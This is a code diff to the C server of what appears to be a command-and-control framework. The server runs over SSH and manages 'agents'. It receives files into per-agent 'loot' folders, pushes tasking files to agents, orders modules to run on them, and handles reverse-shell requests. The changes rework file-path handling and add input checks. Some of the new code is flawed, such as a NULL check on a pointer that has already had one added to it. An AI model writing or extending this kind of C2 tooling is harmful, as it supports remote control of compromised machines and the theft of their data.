@@ -202,32 +202,17 @@ static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
 #endif /* HAVE_ARGP_H */
 
 
-int server_file_download(clientDat *session, char *ptr){
+int server_file_download(clientDat *session, char *ptr, int is_manager, char *extra){
     int rc = 0;
     int size = 0;
     int size_e = 0;
     char *data_ptr;
     char *enc_ptr;
     char buff[BUFSIZ*2];
-    char filename[BUFSIZ];
     char tmpbuffer[256];
     FILE *file;
 
 
-    rc = ssh_channel_write(session->chan, "ok", 3);
-    if(rc == SSH_ERROR){
-        printf("%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
-        return 1;
-    }
-
-    memset(filename, 0, sizeof(filename));
-    rc = ssh_channel_read(session->chan, filename, sizeof(filename), 0);
-    if(rc == SSH_ERROR){
-        printf("%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
-        return 1;
-    }
-
-    // get size and allocate memory segment
     rc = ssh_channel_write(session->chan, "ok", 3);
     if(rc == SSH_ERROR){
         printf("%s: Caught channel error: %s\n", session->id, ssh_get_error(ssh_channel_get_session(session->chan)));
@@ -277,7 +262,12 @@ int server_file_download(clientDat *session, char *ptr){
 
     memset(buff, 0, sizeof(buff));
     memset(tmpbuffer, 0, sizeof(tmpbuffer));
-    sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), ptr, filename);
+    if(is_manager){
+        sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
+    } else {
+        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), session->id, ptr);
+    }
+    printf("%s\n", buff);
     file = fopen(buff, "wb");
     if(file == NULL){
         perror("");
@@ -585,7 +575,7 @@ int server_direct_forwarding(ssh_session session)
     forwarding_channel = ssh_channel_new(session);
     if (forwarding_channel == NULL) {
         printf("Failed to create forwarding channel\n");
-        return rc;
+        return SSH_ERROR;
     }
     rc = ssh_channel_open_forward(forwarding_channel,"www.google.com", 80,"localhost", 5555);
     if (rc != SSH_OK)
@@ -593,7 +583,7 @@ int server_direct_forwarding(ssh_session session)
 
         printf("Failed to open forwarding channel\n");
         ssh_channel_free(forwarding_channel);
-        return rc;
+        return SSH_ERROR;
     }
     nbytes = strlen(http_get);
     nwritten = ssh_channel_write(forwarding_channel,http_get,nbytes);
@@ -651,6 +641,14 @@ void manager_handler(struct clientNode *node){
         ptr += 3;
 
         printf("Manager %s: Operation caught: %d\n", manager->id, operation);
+
+        if(*ptr == '\0'){
+            printf("Manager %s: Caught illegal operation option: NULL\n", manager->id);
+            ssh_channel_write(manager->chan, "er", 3);
+            quitting = 1;
+            continue;
+        }
+
         switch (operation)
         {
         case MANAG_EXIT:
@@ -668,8 +666,16 @@ void manager_handler(struct clientNode *node){
         case MANAG_UP_FILE:
             printf("Manager upload caught\n");
             // Agent_id is stored in ptr
-            server_file_download(manager, ptr);
-            agent_task(AGENT_DOWN_FILE, ptr, filename);
+            d_ptr = strchr(ptr, ':') +1;
+            if(d_ptr == NULL){
+                printf("Wrong format identified from input\n");
+                return;
+            }
+            count = misc_index_of(ptr, ':', 0);
+            dat_ptr = misc_substring(ptr, count, strlen(ptr));
+            
+            server_file_download(manager, d_ptr, 1, dat_ptr);
+            agent_task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
             break;
 
         case MANAG_REQ_RVSH:
@@ -677,9 +683,18 @@ void manager_handler(struct clientNode *node){
             break;
 
         case MANAG_TASK_MODULE:
-            // Agent_id is stored in ptr
-            server_file_download(manager, ptr);
-            agent_task(AGENT_EXEC_MODULE, ptr, filename);
+            // Agent_id is stored in ptr 
+            d_ptr = strchr(ptr, ':') +1;
+            if(d_ptr == NULL){
+                printf("Wrong format identified from input\n");
+                return;
+            }
+            count = misc_index_of(ptr, ':', 0);
+            dat_ptr = misc_substring(ptr, count, strlen(ptr));
+            
+            server_file_download(manager, d_ptr, 1, dat_ptr);
+            
+            agent_task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
             break;
 
         case MANAG_CHECK_LOOT:
@@ -814,6 +829,14 @@ void agent_handler(struct clientNode *node){
 
         printf("Client %s: Operation caught: %d\n", agent->id, operation);
 
+
+        if(*ptr == '\0'){
+            printf("Client %s: Caught illegal operation option: NULL\n", agent->id);
+            ssh_channel_write(agent->chan, "er", 3);
+            quitting = 1;
+            continue;
+        }
+
         switch (operation)
         {
         case AGENT_EXIT:
@@ -831,7 +854,7 @@ void agent_handler(struct clientNode *node){
             break;
 
         case AGENT_UP_FILE:
-            server_file_download(agent, ptr);
+            server_file_download(agent, ptr, 0, NULL);
             break;
 
         case AGENT_REV_SHELL:
